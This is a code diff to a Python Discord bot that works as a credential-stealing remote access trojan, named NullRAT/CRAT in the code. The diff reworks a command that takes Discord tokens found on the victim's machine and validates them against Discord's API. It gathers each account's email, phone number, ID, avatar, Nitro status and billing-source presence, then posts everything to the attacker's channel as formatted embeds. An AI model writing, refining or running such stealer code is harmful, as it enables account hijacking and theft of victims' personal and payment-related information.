@@ -85,36 +85,31 @@ async def raw_tokens(ctx):
 @client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
 async def checked_tokens(ctx):
     await ctx.response.defer()
-    msg, valid, email, phone, uname, nitro, bill = "", [], [], [], [], [], []
-
+    valid, email, phone, uname, nitro, bill, avatar, idq = [], [], [], [], [], [], [], []
+        
     for token in list(dict.fromkeys(find_token())):
         headers = {'Authorization': token, 'Content-Type': 'application/json'}
         requ = get('https://discordapp.com/api/v6/users/@me', headers=headers)
+           
         if requ.status_code == 401: continue
         if requ.status_code == 200:
             json = requ.json()
-            valid.append(str(token))
-            email.append(str(json['email']))
-            phone.append(str(json['phone']))
-            uname.append(f'{json["username"]}#{json["discriminator"]} [{str(json["id"])}]')  
+            valid.append( str(token) )
+            email.append( str(json['email']) )
+            phone.append( str(json['phone']) ) 
+            idq.append(   str(json["id"])   )            
+            uname.append( f'{json["username"]}#{json["discriminator"]}' )
+            avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
             nitro.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()) > 0)))
             bill.append(str(bool(len(get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()) > 0)))
             continue
-            
-    await ctx.followup.send("```ini\n[Checked Tokens from NullRAT]```")
+        
     if len(valid) == 0: 
-        return await ctx.channel.send(embed = Embed(title="No valid Discord Tokens"))
-    
-    for tk, em, ph, un, ni, bi in zip(valid, email, phone, uname, nitro, bill): 
-      msg += f"```{str(tk)}:\nUsername: {str(un)}\nEmail Address: {str(em)}\nPhone Number: {str(ph)}\nNitro Status: {str(ni)}\nBilling Info: {str(bi)}```\n\n"
-    
-    if len(msg) >= 1999: 
-        m2 = msg.split("\n\n")
-        for a in m2:
-            await ctx.channel.send(a)
-    else:
-        return await ctx.channel.send(msg.replace("\n\n", ""))
-    
+        return await ctx.followup.send(embed = Embed(title="No valid Discord Tokens"))
+    await ctx.followup.send("Checking all tokens...")
+    for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
+        await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))    
+        
 @client.slash_command(description="Sends General System Information", guild_ids=server_ids)
 async def gsl(ctx):
     await ctx.response.defer()
@@ -313,6 +308,19 @@ def find_token():
                             tokens.append(token)
         except FileNotFoundError: continue
     return tokens
-    
+
+def checked_embeds(tk, em, ph, un, ni, bi, av, idqa):
+    embed=discord.Embed(title="Checked Token", description="*Tokens checked by CRAT*")
+    embed.set_author(name=creator_name, url="https://github.com/NullCode1337")
+    embed.set_thumbnail(url=av)
+    embed.add_field(name="Token", value=f"```{tk}```", inline=False)
+    embed.add_field(name="Username", value=un, inline=True)
+    embed.add_field(name="ID", value=idqa, inline=True)
+    embed.add_field(name="Nitro", value=ni, inline=True)
+    embed.add_field(name="Billing Info", value=bi, inline=True)
+    embed.add_field(name="Email", value=em, inline=True)
+    embed.add_field(name="Phone Number", value=ph, inline=True)
+    return embed
+
 while is_connected() == False: 0
 client.run(bot_token)
